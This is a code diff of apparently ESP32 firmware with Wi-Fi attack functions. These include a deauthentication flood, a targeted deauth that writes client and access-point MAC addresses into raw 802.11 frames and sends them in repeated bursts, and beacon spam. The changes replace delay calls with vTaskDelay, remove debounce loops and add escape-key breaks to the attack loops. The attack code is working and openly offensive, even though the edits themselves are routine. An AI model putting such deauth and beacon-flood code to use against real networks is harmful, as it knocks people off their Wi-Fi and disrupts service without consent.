@@ -38,11 +38,11 @@ wifi_ap_record_t ap_record;
 ***************************************************************************************/
 void send_raw_frame(const uint8_t *frame_buffer, int size) {
     esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-    delay(1);
+    vTaskDelay(1 / portTICK_RATE_MS);
     esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-    delay(1);
+    vTaskDelay(1 / portTICK_RATE_MS);
     esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-    delay(1);
+    vTaskDelay(1 / portTICK_RATE_MS);
 }
 
 /***************************************************************************************
@@ -65,7 +65,7 @@ void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan
     esp_err_t err;
     err = esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
     if (err != ESP_OK) Serial.println("Error changing channel");
-    delay(50);
+    vTaskDelay(50 / portTICK_RATE_MS);
     memcpy(&deauth_frame[4], target, 6); // Client MAC Address for Station Deauth
     memcpy(&deauth_frame[10], ap_record->bssid, 6);
     memcpy(&deauth_frame[16], ap_record->bssid, 6);
@@ -87,7 +87,6 @@ void wifi_atk_info(String tssid, String mac, uint8_t channel) {
 
     delay(300);
     while (!check(SelPress)) {
-        while (!check(SelPress)) { yield(); } // timerless debounce
         target_atk_menu(tssid, mac, channel);
         returnToMenu = true;
         break;
@@ -156,8 +155,7 @@ void deauthFloodAttack() {
     Serial.begin(115200);
     WiFi.mode(WIFI_AP);
     if (!WiFi.softAP("DeauthFlood", emptyString, 1, 1, 4, false)) {
-        displayError("Failed to start AP");
-        while (!check(SelPress)) { delay(10); }
+        displayError("Failed to start AP", true);
         return;
     }
     wifiConnected = true;
@@ -190,7 +188,9 @@ ScanNets:
             for (int i = 0; i < 100; i++) {
                 send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                 count += 3;
+                if (EscPress) break;
             }
+            if (EscPress) break;
         }
         // Update counter every 2 seconds
         if (millis() - lastTime > 2000) {
@@ -267,7 +267,7 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             padprintln("AP: " + tssid);
             padprintln("Channel: " + String(channel));
             padprintln(mac);
-            delay(50);
+            vTaskDelay(50 / portTICK_RATE_MS);
             redraw = false;
         }
         // Send frame
@@ -283,12 +283,10 @@ void target_atk(String tssid, String mac, uint8_t channel) {
         // Pause attack
         if (check(SelPress)) {
             displayTextLine("Deauth Paused");
-            while (check(SelPress)) { delay(50); } // timeless debounce
             // wait to restart or kick out of the function
             while (!check(SelPress)) {
                 if (check(EscPress)) break;
             }
-            while (check(SelPress)) { delay(50); } // timeless debounce
             redraw = true;
         }
         // Checks para sair do while
@@ -598,11 +596,10 @@ void beaconSpamList(const char list[]) {
         // send packet
         for (int k = 0; k < 3; k++) {
             esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), 0);
-            delay(1);
+            vTaskDelay(1 / portTICK_RATE_MS);
         }
         i += j;
-        ;
-        if (check(EscPress)) break;
+        if (EscPress) break; // Check the variable without changing it
     }
 }
 
@@ -643,8 +640,8 @@ void beaconAttack() {
     String beaconFile = "";
     File file;
     FS *fs;
+    displayTextLine(String(txt));
     while (1) {
-        delay(200);
         if (BeaconMode == 0) {
             beaconSpamList(Beacons);
         } else if (BeaconMode == 1) {
@@ -678,7 +675,6 @@ void beaconAttack() {
             if (BeaconMode == 3) file.close();
             break;
         }
-        displayTextLine(String(txt));
     }
 END:
     wifiDisconnect();
